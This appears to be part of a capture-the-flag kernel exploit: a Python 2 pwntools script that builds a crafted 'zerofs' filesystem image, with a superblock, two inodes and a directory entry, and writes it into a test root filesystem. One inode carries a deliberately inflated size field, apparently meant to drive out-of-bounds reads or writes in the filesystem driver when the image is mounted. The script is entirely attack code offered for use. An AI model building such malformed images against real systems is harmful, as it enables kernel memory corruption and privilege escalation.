#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *

block0 = p64(0x4F52455A) + p64(4096) + p64(3) + p64(0xffffffff ^ 0x7)
block0 = block0.ljust(0x1000, '\x00')

block1 = ''
inode1 = p64(1) + p64(2) + p64(0x4000) + p64(0x1)
inode2 = p64(2) + p64(3) + p64(0x8000) + p64(0xffffffffffffffff)
block1 += inode1 + inode2
block1 = block1.ljust(0x1000, '\x00')

block2 = ''
block2 += '666'.ljust(256, '\x00')
block2 += p64(2)
block2 = block2.ljust(0x1000, '\x00')

img = block0 + block1 + block2 + '\x30' * 0x1000 * 1

with open('../rootfs/tmp/zerofs.img', 'wb') as f:
    f.write(img)